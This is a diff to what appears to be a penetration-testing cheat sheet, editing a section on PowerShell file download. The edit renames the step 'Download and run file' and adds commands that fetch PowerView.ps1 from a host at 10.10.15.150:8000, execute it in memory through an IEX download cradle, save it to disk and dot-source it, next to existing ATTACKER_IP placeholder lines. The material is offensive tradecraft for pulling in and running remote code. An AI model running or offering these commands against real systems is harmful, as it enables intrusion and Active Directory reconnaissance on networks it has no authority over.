@@ -278,16 +278,19 @@ net use * /delete
 
 # 8. PowerShell File Download
 
-Download file:
+Download and run file:
 
 ```powershell
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/file')"
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.150:8000/PowerView.ps1')
 ```
 
 Save file:
 
 ```powershell
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','file.exe')"
+(New-Object Net.WebClient).DownloadFile('http://10.10.15.150:8000/PowerView.ps1', 'PowerView.ps1')
+. .\PowerView.ps1
 ```
 
 ---
